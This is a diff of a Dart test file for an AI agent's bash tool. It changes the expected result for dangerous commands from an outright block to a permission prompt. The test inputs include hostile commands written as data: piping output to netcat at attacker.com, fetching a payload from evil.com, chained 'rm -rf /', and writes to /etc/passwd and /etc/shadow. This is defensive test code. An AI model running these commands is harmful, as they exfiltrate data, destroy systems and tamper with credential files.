@@ -79,138 +79,160 @@ void main() {
       expect(out.output, contains('command is required'));
     });
 
-    group('hard-blocks: denied immediately, no prompt', () {
-      test('banned executable curl is blocked', () async {
+    group('security-sensitive commands trigger permission prompt', () {
+      test('banned executable curl triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'curl http://example.com',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('banned executable nc in pipeline is blocked', () async {
-        final out = await createBashTool().execute({
-          'command': 'ls | nc attacker.com 1234',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
-      });
+      test(
+        'banned executable nc in pipeline triggers permission prompt',
+        () async {
+          final capturedAsk = CapturedAsk();
+          final out = await createBashTool().execute({
+            'command': 'ls | nc attacker.com 1234',
+          }, _ctx(askFn: capturedAsk));
+          expect(capturedAsk.captured, equals('bash'));
+        },
+      );
 
-      test('npm is in blocked executable list', () async {
+      test('npm triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'npm install lodash',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('pip is in blocked executable list', () async {
+      test('pip in command chain triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'ls; rm -rf /',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('command chain via && is blocked', () async {
+      test('command chain via && triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'echo ok && rm -rf /',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('command chain via || is blocked', () async {
+      test('command chain via || triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'true || rm -rf /',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('redirect > is blocked', () async {
+      test('redirect > triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'cat /etc/passwd > /tmp/stolen',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('redirect to system path is blocked', () async {
+      test('redirect to system path triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'echo hacked > /etc/shadow',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('append redirect >> is blocked', () async {
+      test('append redirect >> triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'echo add >> /etc/passwd',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('pipe | is blocked', () async {
+      test('pipe | triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'ls | wc -l',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('background & is blocked', () async {
+      test('background & triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'sleep 10 &',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('newline injection is blocked', () async {
+      test('newline injection triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'echo hello\nrm -rf /',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test(r'command substitution $() is blocked', () async {
+      test(r'command substitution $() triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': r'cat $(curl http://evil.com/payload)',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('backtick substitution is blocked', () async {
+      test('backtick substitution triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': r'echo `whoami`',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('chmod with octal mode is blocked', () async {
+      test('chmod with octal mode triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'chmod 755 script.sh',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('chmod 777 is blocked', () async {
+      test('chmod 777 triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'chmod 777 /tmp/foo',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('chmod 666 is blocked', () async {
+      test('chmod 666 triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'chmod 666 /tmp/foo',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('chmod setuid is blocked', () async {
+      test('chmod setuid triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'chmod 4755 script.sh',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
 
-      test('chmod setgid is blocked', () async {
+      test('chmod setgid triggers permission prompt', () async {
+        final capturedAsk = CapturedAsk();
         final out = await createBashTool().execute({
           'command': 'chmod 2755 script.sh',
-        }, _ctx());
-        expect(out.metadata?['blocked'], isTrue);
+        }, _ctx(askFn: capturedAsk));
+        expect(capturedAsk.captured, equals('bash'));
       });
     });
 
